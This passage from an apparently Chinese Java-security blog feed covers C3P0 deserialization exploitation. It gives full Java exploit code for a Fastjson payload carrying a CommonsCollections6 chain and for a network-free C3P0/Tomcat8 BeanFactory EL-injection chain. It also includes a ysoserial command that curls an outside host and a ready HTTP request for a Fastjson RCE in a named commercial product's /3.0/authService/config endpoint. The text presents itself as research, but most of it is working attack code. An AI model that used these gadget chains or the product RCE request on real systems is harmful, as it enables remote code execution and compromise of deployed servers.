class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.StringWriter;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span>  IllegalAccessException, IOException,  NoSuchFieldException &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">hex</span> <span class="hljs-operator">=</span> toHexAscii(tobyteArray(CC6()));<br><br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;1\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;2\&quot;:&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span> +<br>                <span class="hljs-string">&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br><br>    &#125;<br><br>    <span class="hljs-comment">//CC6的利用链</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">CC6</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;<br>        <span class="hljs-comment">//使用InvokeTransformer包装一下</span><br>        Transformer[] transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        ChainedTransformer chainedTransformer=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        HashMap&lt;Object,Object&gt; hashMap1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        LazyMap lazyMap= (LazyMap) LazyMap.decorate(hashMap1,<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        TiedMapEntry tiedMapEntry=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;abc&quot;</span>);<br>        HashMap&lt;Object,Object&gt; hashMap2=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap2.put(tiedMapEntry,<span class="hljs-string">&quot;eee&quot;</span>);<br>        lazyMap.remove(<span class="hljs-string">&quot;abc&quot;</span>);<br><br><br>        <span class="hljs-comment">//反射修改LazyMap类的factory属性</span><br>        Class clazz=LazyMap.class;<br>        Field factoryField= clazz.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        factoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        factoryField.set(lazyMap,chainedTransformer);<br><br>        <span class="hljs-keyword">return</span> hashMap2;<br>    &#125;<br><br><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span> b, StringWriter sw)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">ub</span> <span class="hljs-operator">=</span> b &amp; <span class="hljs-number">0xff</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> ub / <span class="hljs-number">16</span>;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">h2</span> <span class="hljs-operator">=</span> ub % <span class="hljs-number">16</span>;<br>        sw.write(toHexDigit(h1));<br>        sw.write(toHexDigit(h2));<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">char</span> <span class="hljs-title function_">toHexDigit</span><span class="hljs-params">(<span class="hljs-type">int</span> h)</span><br>    &#123;<br>        <span class="hljs-type">char</span> out;<br>        <span class="hljs-keyword">if</span> (h &lt;= <span class="hljs-number">9</span>) out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x30</span>);<br>        <span class="hljs-keyword">else</span> out = (<span class="hljs-type">char</span>) (h + <span class="hljs-number">0x37</span>);<br>        <span class="hljs-comment">//System.err.println(h + &quot;: &quot; + out);</span><br>        <span class="hljs-keyword">return</span> out;<br>    &#125;<br><br>    <span class="hljs-comment">//将类序列化为字节数组</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] tobyteArray(Object o) <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bao</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bao);<br>        oos.writeObject(o);<br>        <span class="hljs-keyword">return</span> bao.toByteArray();<br>    &#125;<br><br>    <span class="hljs-comment">//字节数组转十六进制</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">toHexAscii</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span><br>    &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> bytes.length;<br>        <span class="hljs-type">StringWriter</span> <span class="hljs-variable">sw</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringWriter</span>(len * <span class="hljs-number">2</span>);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; len; ++i)<br>            addHexAscii(bytes[i], sw);<br>        <span class="hljs-keyword">return</span> sw.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710669.png" alt="image">​</p><p>当然在低版本的fastjson中也是可以的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +<br>        <span class="hljs-string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="hljs-string">&quot;;\&quot;,&quot;</span> +<br>        <span class="hljs-string">&quot;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><p>‍</p><p>但在跟着文章复现的时候确实就有一个疑惑了，在<code>Fastjson</code>​的学习过程当中，我们知道就是在<code>@type</code>​去寻找指定类的时候，是先进行了构造方法的触发，再进行setter方法的调用的，那么在这里是不是有个疑问就是，我先进行了构造方法的触发，那我的<code>setter</code>​方法就没有意义了啊？</p><p>‍</p><p>其实答案在<code>WrapperConnectionPoolDataSourceBase#setUserOverridesAsString</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710920.png" alt="image">​</p><p>如果都不为空就会把三个参数传入<code>vcs.fireVetoableChange</code>​方法中， 跟进下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710078.png" alt="image">​</p><p>实例化了一个<code>PropertyChangeEvent</code>​对象，然后跟进<code>fireVetoableChange(</code>​方法，最后在375行这个地方调用了<code>WrapperConnectionPoolDataSource#vetoableChange</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710233.png" alt="image">​</p><p>跟进下，发现跟之前一样会走到<code>parseUserOverridesAsString</code>​方法成功进行<code>hex</code>​解码并且成功反序列化</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710543.png" alt="image">​</p><p>‍</p><h2 id="C3P0不出网利用"><a href="#C3P0不出网利用" class="headerlink" title="C3P0不出网利用"></a>C3P0不出网利用</h2><p>‍</p><p>只能算是一个科普把，因为利用条件属实苛刻，需要存在Tomcat8相关依赖环境</p><p>前言是说 不论是URLClassLoader加载远程类，还是JNDI注入，都需要目标机器能够出网。而加载Hex字符串的方式虽然不用出网，但却有Fastjson等的相关依赖，但是C3P0是存在一种方式可以摆脱出网的限制的，原因就是他在<code>\mchange-commons-java-0.2.11.jar!\com\mchange\v2\naming\ReferenceableUtils.java#referenceToObject()</code>​中的<code>URLClassLoader</code>​的执行是有特殊的写法的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710779.png" alt="image">​</p><p>他将我们实例化的恶意类强转成了<code>ObjectFactory</code>​类并且调用了<code>getObjectInstance</code>​方法，那么 在JNDI高版本利用中，我们可以加载本地的<code>Factory</code>​类进行攻击，而利用条件之一就是该工厂类至少存在一个<code>getObjectInstance()</code>​方法。比如通过加载Tomcat8中的<code>org.apache.naming.factory.BeanFactory</code>​进行EL表达式注入</p><p>先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-embed-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.15<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>EXP(直接参考了下枫师傅的博客主要是写的太好了)</p><p>由于<code>BeanFactory</code>​中需要<code>Reference</code>​为<code>ResourceRef</code>​类，因此在<code>getReference()</code>​中我们实例化<code>ResourceRef</code>​类，类的构造其实就是构造EL表达式了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> C3P0;<br> <br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br> <br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br> <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0_Tomcat8</span> &#123;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tomcat8_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">resourceRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="hljs-literal">null</span>);<br>            resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;faster=eval&quot;</span>));<br>            resourceRef.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;faster&quot;</span>, <span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));<br>            <span class="hljs-keyword">return</span> resourceRef;<br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br> <br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br> <br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br> <br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-comment">//序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//反射修改connectionPoolDataSource属性值</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br> <br>        <span class="hljs-comment">//序列化流写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br> <br>    &#125;<br> <br>    <span class="hljs-comment">//反序列化</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">Tomcat8_Loader</span> <span class="hljs-variable">tomcat8_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tomcat8_Loader</span>();<br>        Pool_Serial(tomcat8_loader);<br>        Pool_Deserial();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>‍</p><h2 id="实战分析"><a href="#实战分析" class="headerlink" title="实战分析"></a>实战分析</h2><p>‍</p><h3 id="云安宝-云匣子-config-fastjson-RCE"><a href="#云安宝-云匣子-config-fastjson-RCE" class="headerlink" title="云安宝-云匣子 config fastjson RCE"></a>云安宝-云匣子 config fastjson RCE</h3><p>‍</p><h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>‍</p><p>一套<code>springboot</code>​开发的项目，看了下<code>web.xml</code>​没什么东西，再看下<code>springboot</code>​的配置文件<code>spring-servlet.xml</code>​发现把过滤器都写在了这里</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710001.png" alt="image">​</p><p>发现匹配<code>/3.0/authService/**</code>​ 路径的都会走很多过滤器，在这个控制器里头找到了<code>parseObject</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710245.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710432.png" alt="image">​</p><p>那么入口点在这里接下来就是看依赖的事情了</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710650.png" alt="image">​</p><p>用的是fastjson1.2.38 直接打通用的payload即可,这里就是写一下用到了C3P0链</p><p>‍</p><p>由于看到CC依赖不考虑JDK的问题直接打CC6因为yso并没有写回显的代码所以打的只能是控制台回显使用<code>curl</code>​来证明</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar y4-yso.jar CommonsCollections6 <span class="hljs-string">&quot;curl http://xxx:7979&quot;</span> &gt; 1.bin<br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131710140.png" alt="image">​​</p><p>但是发现用公众号发布的payload是可以打出回显的，自己测试了下y4的这个发现并没有成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar y4-yso.jar CommonsCollections6 <span class="hljs-string">&quot;whoami&quot;</span> &gt; 1.bin<br></code></pre></td></tr></table></figure><p>但是确定是没有回显并不是没有执行命令，但因为jdk的限制 无法去字节码加载，也就是只剩下两个思路了，要么就是通过<code>InvokerTransformer</code>​去反射调用这种形式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ScriptEngineManager().getEngineByName(<span class="hljs-string">&quot;js&quot;</span>).<span class="hljs-built_in">eval</span>(恶意代码) <br></code></pre></td></tr></table></figure><p>刚好有公众号发出来的payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">POST /3.0/authService/config HTTP/2<br>Host: xxxx<br>Sec-Ch-Ua: <br>Sec-Ch-Ua-Mobile: ?0<br>Sec-Ch-Ua-Platform: <span class="hljs-string">&quot;&quot;</span><br>Upgrade-Insecure-Requests: 1<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Referer: http://xxxx<br>Cmd: <span class="hljs-built_in">ls</span> -al /tmp/<br>Accept: */*<br>Accept-Encoding: gzip, deflate,br<br>Accept-Language: zh-CN,zh;q=0.9<br>Content-Type: application/json<br>Content-Length: 18907<br><br>&#123;<span class="hljs-string">&quot;a&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;b&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>,<span class="hljs-string">&quot;userOverridesAsString&quot;</span>:<span class="hljs-string">&quot;HexAsciiSerializedMap:;&quot;</span>&#125;&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>将hex数据保存使用 ser-dump后得到以下结果(太长不贴了)</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131706653.png" alt="image">​​</p><p>大致浏览下其实可以发现他用的类方法都是什么 TiedMapEntry  Transformer ConstantTransformer InvokerTransformer</p><p>所以可以猜测的没问题就是通过CC6去加载JS引擎加载恶意类，流程图如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131705547.png" alt="86a67e0d01f5be54b2a0a970ba212fc">​</p><p>‍</p><p>其恶意类为</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401131705951.png" alt="image">​</p><p>加载的恶意类就是个可以回显的命令执行，所以分析结束，emmm其实怎么去加载怎么去写这些马，可能得去把内存马的坑给填上才行了(这里顶多算个回显马)，感谢@xiaoqiuxx@Xenc@Qiu的帮忙一起看看，都是大牛子好叼</p><p>​</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>踩坑 - Java - 记一次差点给Jadx提Issues的踩坑日记</title>
    <link href="/post/step-on-the-pit-zra0as.html"/>
    <url>/post/step-on-the-pit-zra0as.html</url>
    
